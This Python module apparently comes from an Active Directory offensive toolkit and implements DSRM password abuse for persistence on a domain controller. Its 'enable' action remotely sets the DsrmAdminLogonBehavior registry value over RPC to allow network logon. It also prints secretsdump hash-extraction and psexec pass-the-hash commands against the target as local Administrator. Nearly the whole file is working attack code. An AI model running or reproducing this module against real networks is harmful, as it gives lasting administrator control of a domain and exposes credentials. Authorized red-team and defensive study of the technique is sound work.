"""DSRM password abuse — use Directory Services Restore Mode password for persistence."""
import sys
from typing import Any
from adxpl.core.credential import ADCredential

MANIFEST = {
    "capability_id": "adxpl.persistence.dsrm_password.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["registry_modification"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1003.003", "T1556"],
}


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)
    target = args.target
    dsrm_hash = getattr(args, "dsrm_hash", None)
    action = getattr(args, "dsrm_action", "info")

    print(f"[*] DSRM password abuse → {target}")

    if action == "info":
        print("[*] DSRM (Directory Services Restore Mode) persistence:")
        print("  1. Extract DSRM hash: secretsdump.py -just-dc-user 'DC$'")
        print("  2. Enable network logon for DSRM:")
        print('     reg add "HKLM\\System\\CurrentControlSet\\Control\\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2')
        print("  3. PTH with DSRM hash as local Administrator on DC:")
        print(f"     psexec.py -hashes :DSRM_HASH ./Administrator@{target}")
        print()
        print("[*] DSRM password survives AD credential rotation")
        return 0

    if action == "enable":
        print("[*] Enabling DSRM network logon (DsrmAdminLogonBehavior=2)...")
        try:
            from impacket.dcerpc.v5 import rrp, transport
            string_binding = f"ncacn_np:{target}[\\pipe\\winreg]"
            rpc_transport = transport.DCERPCTransportFactory(string_binding)
            if cred.username:
                rpc_transport.set_credentials(cred.username, cred.password or "",
                    cred.domain, cred.lm_hash, cred.nt_hash)

            dce = rpc_transport.get_dce_rpc()
            dce.connect()
            dce.bind(rrp.MSRPC_UUID_RRP)

            resp = rrp.hOpenLocalMachine(dce)
            root_key = resp["phKey"]
            resp = rrp.hBaseRegOpenKey(dce, root_key,
                "System\\CurrentControlSet\\Control\\Lsa")
            lsa_key = resp["phkResult"]
            rrp.hBaseRegSetValue(dce, lsa_key, "DsrmAdminLogonBehavior",
                rrp.REG_DWORD, 2)

            print("[+] DsrmAdminLogonBehavior set to 2")
            print("[+] DSRM persistence enabled — PTH as .\\Administrator")
            dce.disconnect()
            return 0
        except Exception as exc:
            print(f"[-] DSRM enable error: {exc}", file=sys.stderr)
            return 1

    if action == "pth" and dsrm_hash:
        print(f"[*] PTH with DSRM hash → {target}")
        print(f"  psexec.py -hashes :{dsrm_hash} ./Administrator@{target}")
        return 0

    print("[!] Use --dsrm-action info/enable/pth", file=sys.stderr)
    return 1
